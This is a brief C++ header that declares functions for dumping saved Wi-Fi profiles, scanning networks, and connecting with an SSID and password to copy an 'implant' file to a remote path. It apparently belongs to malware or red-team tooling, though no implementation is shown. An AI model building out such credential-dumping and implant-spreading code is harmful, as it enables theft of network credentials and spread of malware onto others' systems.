#pragma once
#include <string>

namespace wifi {
    std::string dumpWifiProfiles();
    std::string scanAvailableWifi();

    bool ConnectAndShareImplant(
        const std::string& ssid,
        const std::string& password,
        const std::string& implantPath,
        const std::string& remotePath
    );
}
